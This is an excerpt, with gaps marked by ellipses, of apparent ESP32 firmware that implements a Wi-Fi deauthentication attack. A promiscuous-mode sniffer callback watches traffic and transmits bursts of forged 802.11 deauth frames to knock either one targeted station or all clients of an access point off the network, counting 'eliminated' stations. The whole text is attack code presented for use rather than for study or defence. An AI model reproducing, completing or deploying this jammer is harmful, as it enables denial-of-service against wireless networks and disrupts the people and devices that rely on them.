...
uint8_t deauth_type;
volatile uint16_t eliminated_stations = 0;
...
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (const wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (const wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *const mac_header = &packet->hdr;
  ...
  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      ...
      for (uint8_t i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, (const uint8_t *)&deauth_frame, sizeof(deauth_frame), false);
      }
      eliminated_stations++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      ...
      for (uint8_t i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, (const uint8_t *)&deauth_frame, sizeof(deauth_frame), false);
      }
    } else return;
  }
...
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  ...
  deauth_type = attack_type & 0x01; // Bit mask to ensure valid type
